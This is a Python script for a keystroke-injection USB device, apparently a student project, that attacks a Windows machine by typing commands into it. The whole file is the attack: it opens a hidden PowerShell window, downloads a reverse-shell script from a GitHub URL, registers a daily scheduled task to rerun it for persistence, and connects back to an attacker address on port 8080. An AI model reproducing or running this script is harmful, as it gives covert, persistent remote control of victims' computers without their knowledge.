# Insert a reverse shell into target device
import os
import time
import HID
from HID import CODE

if __name__ == '__main__':
    # open the search bar on the windows machine
    HID.press(bytes([CODE.LEFT_CTRL, 0, CODE.ESC, *[0] * 5]))
    time.sleep(0.5)
    # open powershell
    cmd = "powershell"
    HID.type_string(cmd)
    time.sleep(0.5)
    HID.press(bytes([*[0] * 2, CODE.ENTER, *[0] * 5]))
    time.sleep(0.5)
    cmd = "powershell.exe -windowstyle hidden"
    HID.type_string(cmd)
    HID.press(bytes([*[0] * 2, CODE.ENTER, *[0] * 5]))
    time.sleep(0.5)
    # changing to this dir as the file will be placed here
    cmd = "cd .\Desktop\Something-Awesome"
    HID.type_string(cmd)
    HID.press(bytes([*[0] * 2, CODE.ENTER, *[0] * 5]))
    time.sleep(0.5)
    # command for the file that downloads the reverse.ps1 file 
    # from the github rep and then executes on target machine
    # will also hide the window after execution only leaving the file 
    cmd = "powershell.exe -nologo -command Invoke-WebRequest -Uri https://raw.githubusercontent.com/thefishua/Something-Awesome/main/reverse.ps1 -Outfile .\\reverse.ps1;" 
    HID.type_string(cmd)
    time.sleep(0.5)
    HID.press(bytes([*[0] * 2, CODE.ENTER, *[0] * 5]))
    # running script every day at 1pm 
    cmd = "$action = New-ScheduledTaskAction -Execute 'reverse.ps1'"
    HID.type_string(cmd)
    time.sleep(0.5)
    HID.press(bytes([*[0] * 2, CODE.ENTER, *[0] * 5]))
    cmd = "$trigger = New-ScheduledTaskTrigger -Daily -At 1pm"
    HID.type_string(cmd) 
    time.sleep(0.5)
    HID.press(bytes([*[0] * 2, CODE.ENTER, *[0] * 5]))
    cmd = "Register-ScheduledTask -Action $action -Trigger $trigger -TaskName 'reverse-task'"
    HID.type_string(cmd)
    time.sleep(0.5)
    HID.press(bytes([*[0] * 2, CODE.ENTER, *[0] * 5]))
    # Setting the ip address and port 
    # allowing to listen to the connection on target machine 
    cmd = " .\\reverse.ps1 192.168.0.188 8080"
    HID.type_string(cmd) 
    time.sleep(0.5)
    HID.press(bytes([*[0] * 2, CODE.ENTER, *[0] * 5]))

